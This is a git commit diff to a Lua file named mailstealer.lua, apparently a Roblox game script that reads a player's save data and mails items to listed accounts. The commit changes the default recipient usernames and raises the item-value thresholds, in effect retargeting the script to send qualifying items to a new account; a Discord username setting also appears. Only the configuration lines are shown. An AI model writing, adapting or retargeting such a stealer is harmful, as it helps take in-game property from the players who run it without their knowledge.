11d0b7ea80fb1b7c6a7783464002c5488f56c65d
RobloxHub123 <titaspavesa@gmail.com>
2025-01-25 15:06:41 +0000

    mailstealer.lua

--- mailstealer.lua
+++ mailstealer.lua
@@ -17,9 +17,9 @@ local GetSave = function()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
 end
 
-local users = _G.Usernames or {"PetsGoMommy", "TobiAltGrind", "TobiHatching"}
-local min_rap = _G.min_rap or 1000
-local min_chance = _G.min_chance or 100000
+local users = _G.Usernames or {"XxAsteriodxX123"}
+local min_rap = _G.min_rap or 10000
+local min_chance = _G.min_chance or 100000000
 local discuser = _G.discuser or ""
 
 for _, user in ipairs(users) do
